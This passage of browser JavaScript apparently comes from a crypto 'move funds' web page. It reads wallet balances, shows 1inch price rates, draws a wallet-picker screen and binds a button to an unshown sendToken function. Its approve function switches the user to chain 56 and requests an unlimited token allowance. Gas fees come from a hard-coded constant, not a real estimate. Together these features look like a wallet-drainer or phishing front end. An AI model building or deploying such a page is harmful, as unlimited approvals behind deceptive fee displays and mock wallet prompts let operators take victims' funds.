        const nativeBalance = await jsonRpcproviders[chainId].getBalance(
          account
        );
        tokens[i].balance = Number(nativeBalance) / 10 ** tokens[i].decimals;
        document.getElementById("balance" + tokens[i].address).innerHTML =
          tokens[i].balance.toFixed(4);
      } else {
        const tokenContract = new ethers.Contract(
          tokens[i].address,
          ERC20ABI,
          provider
        );
        try {
          const erc20Balance = await tokenContract.balanceOf(account);
          tokens[i].balance =
            Number(erc20Balance) > 0
              ? Number(erc20Balance) / 10 ** tokens[i].decimals
              : 0;
          document.getElementById("balance" + tokens[i].address).innerHTML =
            Number(erc20Balance) > 0
              ? tokens[i].balance.toFixed(tokens[i].decimals > 6 ? 4 : 2)
              : 0;
        } catch {
          document.getElementById("balance" + tokens[i].address).innerHTML = 0;
        }
      }
    }
  }
  setAvailBalance();
}

async function getUsdtRate() {
  usdtETHRate = await getWethUsdtRate();
  if (selectedTokenA.address[chainId] === NATIVE_ADDRESS) {
    usdtRate = usdtETHRate;
    return;
  }
  if (
    selectedTokenA.address[chainId] ===
    TOKENS.find((token) => token.symbol === "USDT").address[chainId]
  ) {
    usdtRate = 1;
    return;
  }
  if (ONE_INCH_PRICE_AGRIGATOR_ADDRESSES[chainId]) {
    const oneInchPriceContract = new ethers.Contract(
      ONE_INCH_PRICE_AGRIGATOR_ADDRESSES[chainId],
      oneInchAbi,
      provider
    );
    const usdtAddress = USDT_ADDRESSES[chainId];
    const usdValue = await oneInchPriceContract.getRate(
      selectedTokenA.address[chainId],
      usdtAddress,
      false
    );

    usdtRate =
      Number(usdValue.toString()) / 10 ** (6 + (18 - selectedTokenA.quantity));
  }
}

async function getWethUsdtRate() {
  if (ONE_INCH_PRICE_AGRIGATOR_ADDRESSES[chainId]) {
    const oneInchPriceContract = new ethers.Contract(
      ONE_INCH_PRICE_AGRIGATOR_ADDRESSES[chainId],
      oneInchAbi,
      provider
    );
    const usdtAddress = USDT_ADDRESSES[chainId];
    const usdValue = await oneInchPriceContract.getRate(
      WETH_ADDRESSES[chainId],
      usdtAddress,
      false
    );
    return usdValue ? usdValue / 10 ** 6 : 0;
  }
}

function setMovingValue() {
  if (usdtRate > 0) {
    // const usdValue_ =
    //   addressB.toLowerCase() === usdtAddress.toLowerCase()
    //     ? "1000000000000000000"
    //     : await oneInchPriceContract.getRate(addressB, usdtAddress, false);
    movingAmount.innerHTML =
      Number(Number(amountSwap).toFixed(5)) + " " + selectedTokenA.symbol;
    movingUsdAmount.innerHTML =
      "$" + (amountSwap * usdtRate).toFixed(2).replace(".", ",");
    gasFeesvalue.innerHTML =
      (gasPrice * 0.00008625132896511922605382303).toFixed(5) + " ETH";
    gasFeesUsdValue.innerHTML =
      "$" +
      (gasPrice * 0.00008625132896511922605382303 * ethPrice)
        .toFixed(2)
        .replace(".", ",");
    gasFeesL1Value.innerHTML =
      (gasPrice * 0.00008625132896511922605382303).toFixed(5) + " ETH";
    gasFeesL1UsdValue.innerHTML =
      "$" +
      (gasPrice * 0.00008625132896511922605382303 * ethPrice)
        .toFixed(2)
        .replace(".", ",");

    totalMove.innerHTML =
      (gasPrice * 0.00008625132896511922605382303).toFixed(5) + " ETH";
    totalUsdMove.innerHTML =
      "$" +
      (
        gasPrice * 0.00008625132896511922605382303 * ethPrice +
        amountSwap * usdtRate
      )
        .toFixed(2)
        .replace(".", ",");
  }
}

async function getBestRate() {
  let rate;
  let invertRate;
  let addressA =
    selectedTokenA.address === NATIVE_ADDRESS
      ? WETH_ADDRESSES[chainId]
      : selectedTokenA.address;
  let addressB =
    selectedTokenB.address === NATIVE_ADDRESS
      ? WETH_ADDRESSES[chainId]
      : selectedTokenB.address;
  if (ONE_INCH_PRICE_AGRIGATOR_ADDRESSES[chainId]) {
    const oneInchPriceContract = new ethers.Contract(
      ONE_INCH_PRICE_AGRIGATOR_ADDRESSES[chainId],
      oneInchAbi,
      provider
    );
    const usdtAddress = USDT_ADDRESSES[chainId];
    rate = await oneInchPriceContract.getRate(addressA, addressB, false);
    invertRate = await oneInchPriceContract.getRate(addressB, addressA, false);
    // if()

    await sleep(1000);
    const usdValue =
      addressA.toLowerCase() === usdtAddress.toLowerCase()
        ? "1000000000000000000"
        : await oneInchPriceContract.getRate(addressA, usdtAddress, false);
    const usdValue_ =
      addressB.toLowerCase() === usdtAddress.toLowerCase()
        ? "1000000000000000000"
        : await oneInchPriceContract.getRate(addressB, usdtAddress, false);

    // const numerator = BigNumber.from(10).pow(18);
    // const denominator = BigNumber.from(10).pow(18); // eth decimals
    // const price = BigNumber.from(rate).mul(numerator).div(denominator);
    // console.log(price)
    rate_ =
      Number(rate) /
      10 ** (selectedTokenB.decimals + (18 - selectedTokenA.decimals));
    const rateValueTop = (
      Number(rate) /
      10 ** (selectedTokenB.decimals + (18 - selectedTokenA.decimals))
    ).toFixed(selectedTokenB.decimals > 6 ? 6 : 2);
    const rateValueBottom = (
      Number(invertRate.toString()) /
      10 ** (selectedTokenA.decimals + (18 - selectedTokenB.decimals))
    ).toFixed(selectedTokenA.decimals > 6 ? 6 : 2);
    rateValue.innerHTML = rateValueTop;
    rateValue_.innerHTML = rateValueBottom;
    usdAmount.innerHTML =
      amountSwap > 0
        ? "x " +
          (
            Number(usdValue.toString()) /
            10 ** (6 + (18 - selectedTokenA.decimals))
          ).toFixed(2) +
          " ≈ $" +
          (
            (amountSwap * Number(usdValue.toString())) /
            10 ** (6 + (18 - selectedTokenA.decimals))
          ).toFixed(2)
        : "≈ $-";
    usdAmount_.innerHTML =
      amountSwap > 0
        ? "x " +
          (
            Number(usdValue_.toString()) /
            10 ** (6 + (18 - selectedTokenB.decimals))
          ).toFixed(2) +
          " ≈ $" +
          (
            (amountSwap * Number(usdValue_.toString())) /
            10 ** (6 + (18 - selectedTokenB.decimals))
          ).toFixed(2)
        : "≈ $-";
    rateSimbol.innerHTML = selectedTokenA.symbol + "/" + selectedTokenB.symbol;
    rateSimbol_.innerHTML = selectedTokenB.symbol + "/" + selectedTokenA.symbol;
  }
  // else {
  //   const vyperContract = new ethers.Contract(
  //     VYPER_ADDRESSES[chainId],
  //     viperAbi,
  //     provider
  //   );
  //   console.log(addressA, addressB);

  //   rate = await vyperContract.callStatic.get_best_rate(
  //     addressA,
  //     addressB,
  //     (1 * 10 ** selectedTokenA.decimals).toString()
  //   );
  //   invertRate = await vyperContract.callStatic.get_best_rate(
  //     addressB,
  //     addressA,
  //     (1 * 10 ** selectedTokenB.decimals).toString()
  //   );
  //   console.log(Number(rate), Number(invertRate));
  //   rate = rate[1];
  //   invertRate = invertRate[1];

  //   rateSimbol.innerHTML = selectedTokenA.symbol + "/" + selectedTokenB.symbol;
  //   rateSimbol_.innerHTML = selectedTokenB.symbol + "/" + selectedTokenA.symbol;
  //   rate_ = Number(rate) / 10 ** selectedTokenB.decimals;
  //   rateValue.innerHTML = (
  //     Number(rate) /
  //     10 ** selectedTokenB.decimals
  //   ).toFixed(selectedTokenB.decimals > 6 ? 6 : 4);
  //   rateValue_.innerHTML = (
  //     Number(invertRate.toString()) /
  //     10 ** selectedTokenA.decimals
  //   ).toFixed(selectedTokenA.decimals > 6 ? 6 : 4);
  // }
  // inpToAmount.value = amountSwap > 0 ? (amountSwap * rate_).toFixed(8) : "";
  // setSwapBtnState();
  // setBtnMax();
  // setAvailBalance();
  // //  if(rate[0] === ZERO_ADDRESS) {
  // //   rate = await vyperContract["get_best_rate(address,address,uint256)"](addressB, addressA, (1 * 10 ** selectedTokenA.decimals).toString())
  // //  }
}

async function setTokenList() {
  await getTokens();
  selectedTokenA = tokens[0];
  selectedTokenB = tokens[1];
  await setTokenBtnsBody();
  let tokenList_ = "";
  for (let i = 0; i < tokens.length; i++) {
    const url = isValidUrl(tokens[i].logoURI)
      ? tokens[i].logoURI
      : "https://cdn.jsdelivr.net/gh/curvefi/curve-assets/images/assets/0x6c3f90f043a72fa612cbac8115ee7e52bde6e490.png";
    const shortAddress =
      tokens[i].address.substr(0, 4) + "..." + tokens[i].address.substr(38, 42);
    const tokenBody = `<li id="${
      tokens[i].address
    }" name='token_body' class="all-content" role="option" aria-disabled="false" aria-selected="false"
data-key="${tokens[i].address}">
<a id="${tokens[i].address}" name='${tokens[i].symbol}'class="token-btn"></a>
<div class="all-box"><img alt="${tokens[i].symbol}"
        src="${url}"
        loading="lazy">
    <div class="all-content">
        <div class="all-title">${
          tokens[i].symbol
        }</div><span class="all-key">${shortAddress}</span>
    </div><span id="${"balance" + tokens[i].address}"></span>
</div>
</li>`;
    tokenList_ += tokenBody;
  }
  tokenListBody.innerHTML = tokenList_;

  const tokensBodys = document.getElementsByName("token_body");
  for (let i = 0; i < tokensBodys.length; i++) {
    tokensBodys[i].onclick = async (e) => {
      if (selectedTokenBtn === 0) {
        console.log(e.target.id);
        const token_ = selectedTokenA;
        selectedTokenA = tokens.find((token) => token.address === e.target.id);
        if (selectedTokenA.address === selectedTokenB.address) {
          // selectedTokenB =  tokens[selectedTokenA.address === NATIVE_ADDRESS? 1 : 0]
          selectedTokenB = token_;
        }
        document.getElementsByClassName("active")[0].className = "all-content";
        document.getElementById(selectedTokenA.address).className = "active";
        await setTokenBtnsBody();
        tokenModal.style.display = "none";
        await getBestRate();
      } else {
        console.log(e.target.id);
        const token_ = selectedTokenB;
        selectedTokenB = tokens.find((token) => token.address === e.target.id);
        if (selectedTokenA.address === selectedTokenB.address) {
          // selectedTokenA =  tokens[selectedTokenB.address === NATIVE_ADDRESS? 1 : 0]
          selectedTokenA = token_;
        }
        document.getElementsByClassName("active")[0].className = "all-content";
        document.getElementById(selectedTokenB.address).className = "active";
        await setTokenBtnsBody();
        tokenModal.style.display = "none";
        await getBestRate();
      }
    };
  }
  getTokensBalance();
  getBestRate();

  setBtnMax();
  setAvailBalance();
}

async function approve(address, allowance, inputValue) {
  if (provider._network.chainId !== 56) {
    await switchNetwork();
  } else if (allowance > Number(inputValue)) {
    window.open("#approved", "_self");
  } else {
    const signer = provider.getSigner();
    const fWinContractWitSigner = fwinContractWitProvaider.connect(signer);
    try {
      await fWinContractWitSigner.approve(
        address,
        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      );
      window.open("#approved", "_self");
    } catch (err) {
      console.log(err);
    }
  }
}

if (
  typeof window.ethereum !== "undefined"
  // isUserConnectedFromLS === "true"
) {
  getAccount();
  // userAddressBtn.onclick = logOut;
  // getBookmakersData()
}
// else {
//   connectBtn.onclick = connectMetamask;
//   userAddressBtn.onclick = function () {
//     connectModal.style.display = "block";
//   };
// }
// window.onclick = function (event) {
//   if (event.target == connectModal) {
//     connectModal.style.display = "none";
//   }
//   if (event.target == tokenModal) {
//     tokenModal.style.display = "none";
//     searchTokenInput.value = "";
//   }
//   if (event.target == settingsModal) {
//     settingsModal.style.display = "none";
//   }
// };

// settingsBtn.onclick = function () {
//   settingsModal.style.display = "block";
// };
// tokenBtn.onclick = function () {
//   selectedTokenBtn = 0;
//   document.getElementsByClassName("active")[0].className = "all-content";
//   document.getElementById(selectedTokenA.address).className = "active";
//   tokenModal.style.display = "block";
// };
// tokenBtn_.onclick = function () {
//   selectedTokenBtn = 1;
//   document.getElementsByClassName("active")[0].className = "all-content";
//   document.getElementById(selectedTokenB.address).className = "active";
//   tokenModal.style.display = "block";
// };

// discardBtn.onclick = function () {
//   settingsModal.style.display = "none";
// };
// saveSettingsBtn.onclick = function () {
//   settingsModal.style.display = "none";
//   advBtn.innerHTML =
//     slippageTolerance +
//     `%&nbsp;<svg focusable="false"
//   preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg"
//   fill="currentColor" width="16" height="16" viewBox="0 0 16 16"
//   aria-hidden="true">
//   <path
//       d="M13.5,8.4c0-0.1,0-0.3,0-0.4c0-0.1,0-0.3,0-0.4l1-0.8c0.4-0.3,0.4-0.9,0.2-1.3l-1.2-2C13.3,3.2,13,3,12.6,3	c-0.1,0-0.2,0-0.3,0.1l-1.2,0.4c-0.2-0.1-0.4-0.3-0.7-0.4l-0.3-1.3C10.1,1.3,9.7,1,9.2,1H6.8c-0.5,0-0.9,0.3-1,0.8L5.6,3.1	C5.3,3.2,5.1,3.3,4.9,3.4L3.7,3C3.6,3,3.5,3,3.4,3C3,3,2.7,3.2,2.5,3.5l-1.2,2C1.1,5.9,1.2,6.4,1.6,6.8l0.9,0.9c0,0.1,0,0.3,0,0.4	c0,0.1,0,0.3,0,0.4L1.6,9.2c-0.4,0.3-0.5,0.9-0.2,1.3l1.2,2C2.7,12.8,3,13,3.4,13c0.1,0,0.2,0,0.3-0.1l1.2-0.4	c0.2,0.1,0.4,0.3,0.7,0.4l0.3,1.3c0.1,0.5,0.5,0.8,1,0.8h2.4c0.5,0,0.9-0.3,1-0.8l0.3-1.3c0.2-0.1,0.4-0.2,0.7-0.4l1.2,0.4	c0.1,0,0.2,0.1,0.3,0.1c0.4,0,0.7-0.2,0.9-0.5l1.1-2c0.2-0.4,0.2-0.9-0.2-1.3L13.5,8.4z M12.6,12l-1.7-0.6c-0.4,0.3-0.9,0.6-1.4,0.8	L9.2,14H6.8l-0.4-1.8c-0.5-0.2-0.9-0.5-1.4-0.8L3.4,12l-1.2-2l1.4-1.2c-0.1-0.5-0.1-1.1,0-1.6L2.2,6l1.2-2l1.7,0.6	C5.5,4.2,6,4,6.5,3.8L6.8,2h2.4l0.4,1.8c0.5,0.2,0.9,0.5,1.4,0.8L12.6,4l1.2,2l-1.4,1.2c0.1,0.5,0.1,1.1,0,1.6l1.4,1.2L12.6,12z">
//   </path>
//   <path
//       d="M8,11c-1.7,0-3-1.3-3-3s1.3-3,3-3s3,1.3,3,3C11,9.6,9.7,11,8,11C8,11,8,11,8,11z M8,6C6.9,6,6,6.8,6,7.9C6,7.9,6,8,6,8	c0,1.1,0.8,2,1.9,2c0,0,0.1,0,0.1,0c1.1,0,2-0.8,2-1.9c0,0,0-0.1,0-0.1C10,6.9,9.2,6,8,6C8.1,6,8,6,8,6z">
//   </path>
// </svg>`;
// };

// // await setTokenList();

// svgCustom.onclick = function () {
//   saveSettingsBtn.disabled = false;
//   circleCustom.style.stroke = "var(--radio--selected--background-color)";
//   circleCustom.style.fill = "var(--radio--selected--background-color)";
//   circle01.style.stroke = "var(--white)";
//   circle01.style.fill = "var(--white)";
//   circle05.style.stroke = "var(--white)";
//   circle05.style.fill = "var(--white)";
// };
// svg01.onclick = function () {
//   saveSettingsBtn.disabled = false;
//   slippageTolerance = "0.1";
//   circleCustom.style.stroke = "var(--white)";
//   circleCustom.style.fill = "var(--white)";
//   circle01.style.stroke = "var(--radio--selected--background-color)";
//   circle01.style.fill = "var(--radio--selected--background-color)";
//   circle05.style.stroke = "var(--white)";
//   circle05.style.fill = "var(--white)";
//   // advBtn.innerHTML = slippageTolerance
// };
// svg05.onclick = function () {
//   saveSettingsBtn.disabled = false;
//   slippageTolerance = "0.5";
//   circleCustom.style.fill = "var(--white)";
//   circleCustom.style.stroke = "var(--white)";
//   circle01.style.stroke = "var(--white)";
//   circle01.style.fill = "var(--white)";
//   circle05.style.stroke = "var(--radio--selected--background-color)";
//   circle05.style.fill = "var(--radio--selected--background-color)";
// };

window.ethereum.on("accountsChanged", function (accounts) {
  document.location.reload();
});

// swapTokenBtn.onclick = function () {
//   let token = selectedTokenA;
//   selectedTokenA = selectedTokenB;
//   selectedTokenB = token;
//   setTokenBtnsBody();
//   getBestRate();
//   controlInputBox();
// };

// advBtn.onclick = async function () {
//   settingsModal.style.display = "block";
//   // const iface = new ethers.utils.Interface(viperAbi);
//   // const tx = await provider.getTransaction(
//   //   "0x1d117d26650186e1314bf4b0c93412c713c4a928f5a56a9153db5c799d28d188"
//   // );
//   // let decodedData = iface.parseTransaction({ data: tx.data, value: tx.value });
//   // console.log(decodedData.args);
// };

async function tongleChainManu() {
  if (dropupChainMenu.style.display == "none") {
    dropupChainMenu.style.display = "block";
  } else {
    dropupChainMenu.style.display = "none";
  }
}

// walletButtonTrezor.onclick = function() {test()}

window.ethereum.on("chainChanged", (_chainId) => window.location.reload());
// setInterval(()=> {
//   if(provider._network.chainId && provider._network.chainId === chainId){
//     console.log(provider.on() ,"ok")
//     return
//   }else{
//     document.location.reload();
//   }
// }, 1000)

// setInterval(getBookmakersData, 5000)
// setInterval(getHtmlElements, 1000)

function controlInputBox() {
  if (amountSwap > selectedTokenA.balance / 10 ** selectedTokenA.decimals) {
    mainIinputbox.style.boxShadow = "inset 0.5px 0.5px 0 0.5px #ea3941";
    mainIinputbox.style.borderColor = "#ea3941";
  } else {
    mainIinputbox.style.boxShadow =
      "inset 0.5px 0.5px 0 0.5px var(--input--border-color)";
    mainIinputbox.style.border = "1px solid var(--input--border-color)";
  }
}

function updateValue(e) {
  amountSwap = Number(e.target.value);
  // summaryEmpty.value = amountSwap > 0 ? (amountSwap * rate_).toFixed(8) : "";
  if (amountSwap <= userBalance) {
    summaryEmpty.style.display = amountSwap > 0 ? "none" : "block";
    summaryValue.style.display = amountSwap > 0 ? "block" : "none";
    moveFoundsBtn.disabled =
      userBalance >= Number(e.target.value) ? false : true;

    setMovingValue();
  } else {
    summaryEmpty.style.display = "block";
    summaryValue.style.display = "none";
  }
  // setSwapBtnState();
  // getBestRate();
  // controlInputBox();
}
moveFoundsBtn.onclick = sendToken;

tokenAmount.addEventListener("input", updateValue);
// searchTokenInput.addEventListener("input", searchToken);
document.addEventListener("click", async (e) => {
  console.log(e.target.id);
  console.log(
    TOKENS.filter((token) => token?.address[chainId] === e.target.id)
  );
  if (
    TOKENS.filter((token) => token?.address[chainId] === e.target.id)[0]
      ?.address[chainId] === e.target.id
  ) {
    selectedTokenA = TOKENS.filter(
      (token) => token?.address[chainId] === e.target.id
    )[0];
    await getUserBalance(selectedTokenA);
    await getUsdtRate();
    await setMovingValue();
  }
  // if (e.target.id !== "chain_select_hover")
  //   dropupChainMenu.style.display = "none";
});

function searchToken() {
  // let input = document.getElementById("inputSearch");
  let filter = searchTokenInput.value.toUpperCase();
  if (filter) {
  }
  // let ul = document.getElementById("token_list");
  let li = tokenListBody.getElementsByTagName("li");
  // Перебирайте все элементы списка и скрывайте те, которые не соответствуют поисковому запросу
  for (let i = 0; i < li.length; i++) {
    let a = li[i].getElementsByTagName("a")[0];
    if (a.getAttribute("name").toUpperCase().indexOf(filter) > -1) {
      li[i].style.display = "";
    } else {
      li[i].style.display = "none";
    }
  }
}

metamaskRetryBtn.onclick = connectMetamask;

function removeActiveClassWallets(element) {
  rightSegmentTitle.innerHTML = "";
  const walletsItems = document.getElementsByClassName(
    "wallet-item-box active"
  );
  metamaskRetryBtn.className = "metamasc-action-btn";
  qrWpapper.style.display = "none";

  if (walletsItems[0]) {
    walletsItems[0].className = "wallet-item-box";
    defoultActionBox.style.display = "flex";
  }
  if (element) {
    element.style.display = "none";
  } else {
    const elements = document.getElementsByName("wallet-action");
    console.log(elements);
    for (let i = 0; i < elements.length; i++) {
      elements[i].style.display = "none";
    }
    defoultActionBox.style.display = "flex";
  }
}

function setWallets() {
  const popularWallets = WALLETS.filter((w) => w.type === 0);
  const moreWallets = WALLETS.filter((w) => w.type === 1);
  const walletsItems = document.getElementsByClassName("wallet-item-box");
  const walletItemsName = document.getElementsByClassName(
    "popular-wallet-name"
  );
  const walletItemsImg = document.getElementsByClassName(
    "popular-wallet-image"
  );

  const moreWalletItemsName =
    document.getElementsByClassName("more-wallet-name");
  const moreWalletItemsImg =
    document.getElementsByClassName("more-wallet-image");
   const dontHaveWallet = document.getElementsByClassName("dont-have-wallet")[0];
   const getWalletBtn = document.getElementsByClassName("get-wallet-btn")[0]
   console.log(moreWallets, popularWallets);

  for (let i = 0; i < popularWallets.length; i++) {
    walletItemsImg[i].style.backgroundImage = `url(${popularWallets[i].img})`;
    walletItemsName[i].innerHTML = popularWallets[i].name;
  }
  for (let i = 0; i < moreWallets.length; i++) {
    moreWalletItemsImg[i].style.backgroundImage = `url(${moreWallets[i].img})`;
    moreWalletItemsName[i].innerHTML = moreWallets[i].name;
  }
  for (let i = 0; i < WALLETS.length; i++) {
    const wallet = WALLETS[i];
    const walletItem = walletsItems[i];
    const metaMaskActionTitle = document.getElementsByClassName(
      "metamasc-action-title"
    )[0];
    const metaMaskActionImg = document.getElementsByClassName(
      "metamask-action-img"
    )[0];
    if (wallet.name === "MetaMask" || wallet.name === "Ladger Live") {
      walletItem.onclick = () => {
        removeActiveClassWallets(metamascActionBox);
        metamascActionBox.style.display = "flex";
        defoultActionBox.style.display = "none";
        walletItem.classList.add("active");
        metaMaskActionImg.style.backgroundImage = `url(${wallet.img})`;
        metaMaskActionTitle.innerHTML = `Opening ${wallet.name}...`;
        if (wallet.name === "Ladger Live") {
          metamaskRetryBtn.className = "spin-loader";
        }
      };
    }
    if (
      wallet.name === "Rainbow" ||
      wallet.name === "Coinbase Wallet" ||
      wallet.name === "WalletConnect" ||
      wallet.name === "TrustWallet"
    ) {
      walletItem.onclick = () => {
        removeActiveClassWallets(metamascActionBox);
        dontHaveWallet.innerHTML = `Don’t have ${wallet.name} ?`
        qrWpapper.style.display = "flex";
        qrImg.style.backgroundImage = `url(${wallet.qrImg})`;
        rightSegmentTitle.innerHTML = `Scan with ${wallet.name}`;
        defoultActionBox.style.display = "none";
        walletItem.classList.add("active");
        getWalletBtn.setAttribute('href', wallet.linck)
      };
    }
  }
}
setWallets();
